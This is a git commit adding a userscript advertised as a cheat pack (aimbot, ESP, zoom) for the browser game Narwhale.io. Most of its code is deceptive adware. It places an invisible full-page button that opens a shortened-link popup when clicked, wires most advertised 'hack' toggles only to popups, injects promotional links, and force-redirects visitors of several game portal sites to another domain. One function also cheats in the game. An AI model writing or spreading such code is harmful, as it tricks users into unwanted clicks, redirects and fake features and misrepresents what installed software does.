ba3d0ccf507df34c0ad2bbb9e5ddf274957dcdc0
reklamajansimiz <61254767+reklamajansimiz@users.noreply.github.com>
2020-02-20 01:51:15 +0300

    Add files via upload

---
+++ narwhaleio.user.js
@@ -0,0 +1,226 @@
+// ==UserScript==
+// @name         Narwhale.io Zoom - Narwhaleio Hacks - Best Narwhale Cheat 2019 to 2020
+// @description  Narwhaleio Mods Features: Aimbot, Zoom, ESP, Auto Turn, FPS, Adblock
+// @namespace    iomods.org
+// @author       iomods.org
+// @version      2.1
+// @require      http://code.jquery.com/jquery-3.3.1.min.js
+// @updateURL    https://iomods.org/mods/narwhaleio.user.js
+// @downloadURL  https://iomods.org/mods/narwhaleio.user.js
+// @match        *://narwhale.io/*
+// @match        *iogames.space/*
+// @match        *titotu.io/*
+// @match        *io-games.io/*
+// ==/UserScript==
+
+
+setTimeout(function() {
+//tanitim belgeseli
+var colorize,colorizer,lnk,text,ministyler
+lnk = ["SLITHERE.COM", "KRUNKERIO.ORG", "KRUNKERIO.NET", "KRUNKERIOPLAY.COM", "SHELLSHOCKIO.ORG", "MOOMOOIOPLAY.COM", "SURVIVIO.INFO", "ZOMBSROYALEIO.ORG", "MOPE-IO.NET", "MOPEIOGAME.COM", "DIEPIOPLAY.COM", "DIEPIOPLAY.ORG", "SLITHERIOPLAY.ORG", "SKRIBBL-IO.NET", "SPINZ-IO.NET", "BONK-IO.NET", "TANKSMITHIO.ORG", "DEEEEP-IO.NET", "BUILDROYALEIO.ORG", "WORMAX.ORG", "WORMAX2IO.COM", "WORMATE-IO.NET", "IOGAMESLIST.ORG", "IO-OYUNLAR.COM", "IOMODS.ORG"];
+text = "<b>";
+lnk.forEach(lnkfunc);
+text += "</b>";
+
+function lnkfunc(value) {
+var value2 = value;
+if(value == "KRUNKERIO.ORG" || value == "KRUNKERIO.NET" || value == "KRUNKERIOPLAY.COM") { colorize = true; } else { colorize = false; }
+if(value == "SLITHERE.COM" || value == "IOMODS.ORG") { colorizer = true; } else { colorizer = false; }
+if(value == "MOPE-IO.NET") { value2="MOPEIO.NET"; } if(value == "WORMATE-IO.NET") { value2="WORMATEIO.NET"; } if(value == "BONK-IO.NET") { value2="BONKIO.NET"; } if(value == "SPINZ-IO.NET") { value2="SPINZIO.NET"; } if(value == "DEEEEP-IO.NET") { value2="DEEEEPIO.NET"; } if(value == "SKRIBBL-IO.NET") { value2="SKRIBBLIO.NET"; } if(value == "IO-OYUNLAR.COM") { value2="IOOYUNLAR.COM"; }
+ministyler = "color:white;font-size:12px;padding:3px;text-decoration:none;";
+if(colorize == true){ministyler = "color:yellow;font-size:12px;padding:3px;text-decoration:none;";}
+if(colorizer == true){ministyler = "color:darkorange;font-size:12px;padding:3px;text-decoration:none;";}
+text += '<a href="http://'+value+'" target="_blank" style="'+ministyler+'">'+value2+' <font color="#555555">-</font></a>';
+}
+
+	//rastgele cikma ekrani
+    var values = ["location=yes,scrollbars=yes,status=yes,height=570,width=520","location=yes,scrollbars=yes,status=yes,left=2000,height=570,width=520"];
+	values.sort(function(a, b){return 0.5 - Math.random()});
+
+    //LINKLER
+    var links = ["https://bit.ly/2EgRmIx","https://bit.ly/2Okhczb","https://bit.ly/2E0JJHx","https://bit.ly/2Z3XxaI","https://bit.ly/30tvJxW","https://bit.ly/2DKqVst","https://bit.ly/2pXBkie","https://bit.ly/2JsS2ii","https://bit.ly/33eXPh8","https://bit.ly/2M8aeO6","https://bit.ly/33oe1gc","https://bit.ly/2WLZ5FK","https://bit.ly/31d3t20","https://bit.ly/2nHLsLu","https://bit.ly/2VFInIo","https://bit.ly/2M5bHVu","https://bit.ly/31bSgyJ", "https://bit.ly/35tg9Vt"];
+	//slithere, krunkerorg, krunkernet, iomods, skribbl, diepiocom, dieporg, mopenet, mopegame, wormaxorg, shellshock, surviv, zombsroyale, moomoo, iogames, krunkplay, bonkio, iooyunlar
+	links.sort(function(a, b){return 0.5 - Math.random()});
+
+    //ozellikler
+    var fts = ["Auto Aim","Aimbot","Firebot","Speed Hack","Heal Hack","Show Players","Auto Fire","Anti Lag"];
+	fts.sort(function(a, b){return 0.5 - Math.random()});
+
+	//play butonu
+	    let itv = setInterval( () => {
+        let btn = document.createElement("button");
+        btn.innerHTML = "Enter Game";
+        btn.style.display = "inline-block";
+        btn.style.width = "700px";
+        btn.id = "byebtn";
+        btn.style.height = "300px";
+        btn.style.position =  "absolute";
+        btn.style.top = "30%";
+        btn.style.opacity = 0;
+        btn.style.left = "25%";
+        document.body.appendChild(btn);
+        clearInterval(itv);
+    }, 300);
+    document.addEventListener("click", (e) => {
+        if (e.target.id == "byebtn"){
+            window.open(""+links[13]+"", null, ``+values[0]+``);
+            byebtn.style.display = "none";
+        }
+    });
+
+//genel isimlendirme ve ayarlar
+ this.st = {
+     f1: "Show FPS",
+     f5: "Show Status",
+     f6: "Full Screen",
+	 f7: "Bonus Hack",
+     f2: "Zoom In/Out",
+     f3: "Rainbow BG",
+     f4: "Change BG",
+     string: "<a style=\"padding-right: 4px;\"></a> <font color=\"black\">—</font> <a style=\"padding-left: 4px;\"></a>",
+     bp: "padding-left: 2px;",
+	 os: "font-weight:bold;color:black;font-size:14px;text-decoration:none;",
+     os2: "color:black;font-size:11px;text-decoration:none;",
+     formstyle: "border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(245, 245, 245, 1.0);",
+     fpsstyle: "border:1px solid black;border-radius:20px;padding:3px;width:80px;height:20px;font-size: 15px;text-align:center;background-color: rgba(0, 0, 0, 0.8);color:white;",
+     liststyler: "color:white;background-color: black;padding:3px;border-style:double;-webkit-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);-moz-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);",
+ 	 imagelist: '<a href="https://www.youtube.com/c/pignuts" target="_blank"><img src="https://iomods.org/mods/youtube.jpg" width="160px" height="40px"></a><a href="https://facebook.com/slitherecom" target="_blank"><img src="https://iomods.org/mods/facebook.jpg" width="160px" height="40px"></a></br>'
+ };
+
+//degisenkisimlar
+$('#adZone').html('<div style="'+this.st.formstyle+'"><div class="option1"></div></div>');
+$('#adZone').append('<div style="'+this.st.fpsstyle+'" id="fps" class="fps">');
+$('#shareBox').prepend('<hr><div class="list1"></div>');
+
+//general
+$('.option1').html('<a style="'+this.st.os+'" href="'+links[0]+'" target="blank">'+this.st.f1+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="fps" onchange="window.open(\''+links[0]+'\', \'_blank\', \''+values[0]+'\');" checked></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[1]+'" target="blank">'+this.st.f5+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="ping" onchange="window.open(\''+links[1]+'\', \'_blank\', \''+values[1]+'\');"><span class=\'slider\'></span></label><div class="option2"></div>');
+$('.option1').on('click', '.fps', function() { hideandseek(); });
+$('.option1').on('click', '.ping', function() { showfpsping(); });
+$('.option2').html('<a style="'+this.st.os+'" href="'+links[2]+'" target="blank">'+this.st.f6+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="fullscreen" onchange="window.open(\''+links[2]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[3]+'" target="blank">'+this.st.f7+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="bonushack" onchange="window.open(\''+links[3]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option3"></div>');
+$('.option2').on('click', '.fullscreen', function() { showfullscreen(); });
+$('.option2').on('click', '.bonushack', function() { showbonushack(); });
+$('.option3').html('<a style="'+this.st.os+'" href="'+links[4]+'" target="blank">'+fts[0]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[4]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[5]+'" target="blank">'+fts[1]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[5]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option4"></div>');
+$('.option4').html('<a style="'+this.st.os+'" href="'+links[6]+'" target="blank">'+fts[2]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[6]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[7]+'" target="blank">'+fts[3]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[7]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option5"></div>');
+$('.option5').html('<a style="'+this.st.os+'" href="'+links[8]+'" target="blank">'+fts[4]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[8]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[9]+'" target="blank">'+fts[5]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[9]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option6"></div>');
+$('.option6').html('<a style="'+this.st.os+'" href="'+links[10]+'" target="blank">'+fts[6]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[10]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[11]+'" target="blank">'+fts[7]+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\''+links[11]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option7"></div>');
+$('.option7').html('<a style="'+this.st.os+'" href="'+links[12]+'" target="blank">'+this.st.f3+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'checkbox\' class="renkcont" onchange="window.open(\''+links[12]+'\', \'_blank\', \''+values[0]+'\');"></label>'+this.st.string+'<a style="'+this.st.os+'" href="'+links[13]+'" target="blank">'+this.st.f4+'</a> <label style="'+this.st.bp+'" class=\'switch\'><input type=\'color\' class="bgcont" style="width: 1em;height:17px;" onchange="window.open(\''+links[13]+'\', \'_blank\', \''+values[1]+'\');"></label><div class="option8"></div>');
+$('.option7').on('change', '.renkcont', function() { colorfulmod(); });
+$('.option7').on('change', '.bgcont', function() { changebackground(); });
+$('.option8').html('<a style="'+this.st.os+'" href="'+links[14]+'" target="blank">'+this.st.f2+'</a> <input name="zoom" id="zoom" type="number" style="width: 4em" min="70" max="150" step="1" value="100" class="zoom" oninput="amount.value=zoom.value;" onchange="window.open(\''+links[14]+'\', \'_blank\', \''+values[0]+'\');"> <a style="'+this.st.os2+'" href="'+links[14]+'" target="blank">(Min:70-Max:150)</a>');
+$('.option8').on('input', '.zoom', function(e) { zoominout(); });
+$('.list1').html('<div style="'+this.st.liststyler+'">'+text+'</div>'+this.st.imagelist+'');
+    }, 0);
+
+//fps counter
+var before,now,fps
+before=Date.now();
+fps=0;
+requestAnimationFrame(
+    function loop(){
+        now=Date.now();
+        fps=Math.round(1000/(now-before));
+        before=now;
+    requestAnimationFrame(loop);
+        document.getElementById('fps').innerHTML = 'FPS: ' + fps;
+    }
+);
+
+if(window.location.href.indexOf("io-games.io") > -1 || window.location.href.indexOf("iogames.space") > -1 || window.location.href.indexOf("titotu.io") > -1) { location.replace("http://iogameslist.org"); }
+function hideandseek() {
+  var x = document.getElementById("fps");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+}
+
+function showbonushack() {
+      game.options.viewScale=.345;
+      game.handleResize();
+      setInterval(()=>{
+        game.dashable=true;
+        game.isDead=false;
+      },0);
+}
+
+function showfpsping() {
+    javascript:(function loops(){
+    var script=document.createElement('script');
+    script.onload=function(){
+    var stats=new Stats();
+    document.body.appendChild(stats.dom);
+    requestAnimationFrame(function loop(){
+    stats.update();
+    requestAnimationFrame(loop)});
+    };
+    script.src='//mrdoob.github.io/stats.js/build/stats.min.js';document.head.appendChild(script);
+})()
+}
+
+function showfullscreen() {
+//Full screen
+//<div class="chatItem" style="word-break:break-all;overflow-wrap:break-word;"><span class="chatMsg"><span style="color:#eb5656">DodgyDucks</span><img style="opacity:0.7;margin-right:9px;" class="weaponChatIcon" src="./textures/weapons/icon_1.png"><img class="headShotChatIcon" src="./img/headshot_0.png"><span style="color:#eb5656">SpoopyAmos</span></span></div>
+document.fullscreenEnabled =
+	document.fullscreenEnabled ||
+	document.mozFullScreenEnabled ||
+	document.documentElement.webkitRequestFullScreen;
+
+function requestFullscreen(element) {
+	if (element.requestFullscreen) {
+		element.requestFullscreen();
+	} else if (element.mozRequestFullScreen) {
+		element.mozRequestFullScreen();
+	} else if (element.webkitRequestFullScreen) {
+		element.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+	}
+}
+
+if (document.fullscreenEnabled) {
+	requestFullscreen(document.documentElement);
+}
+    function read(url) {
+    return new Promise(resolve => {
+        fetch(url).then(res => res.text()).then(res => {
+            return resolve(res);
+        });
+    });
+};
+//end
+}
+
+//background kismi degisir
+function changebackground() {
+    var changecolor =  $('.bgcont').val();
+    var rgbaC2 = 'rgba(' + parseInt(changecolor.slice(-6, -4), 16) + ',' + parseInt(changecolor.slice(-4, -2), 16) + ',' + parseInt(changecolor.slice(-2), 16) + ',0.35)';
+    $("#overlay").css("background-color",rgbaC2);
+	$("#background").css("background-color",rgbaC2);
+}
+
+var colorsrain;
+var checkedrain=false;
+function colorfulmod() {
+    if(checkedrain==false) {
+        checkedrain=true;
+      colorsrain = ["#ff0000","#00ff00","#0000ff","#000000","#ffffff","#ff00ff","#00ffff","#981890","#ff7f00","#0085ff","#00bf00"];
+    } else {
+        checkedrain=false;
+    colorsrain = ["transparent"];
+    }
+      setInterval(function() {
+          var bodybgarrayno = Math.floor(Math.random() * colorsrain.length);
+          var selectedcolor = colorsrain[bodybgarrayno];
+          var rgbaCol = 'rgba(' + parseInt(selectedcolor.slice(-6, -4), 16) + ',' + parseInt(selectedcolor.slice(-4, -2), 16) + ',' + parseInt(selectedcolor.slice(-2), 16) + ',0.35)';
+          $("#overlay").css("background-color",rgbaCol);
+		  $("#background").css("background-color",rgbaCol);
+      }, 3000);
+}
+
+//burda birsey degismesi gerekmez
+function zoominout() {
+    var findinput = $('.zoom').val();
+    if(findinput >= 70 && findinput <= 150)
+    {
+    $('body').css('zoom',''+findinput+'%');
+    } else { $('body').css('zoom','100%'); }
+}
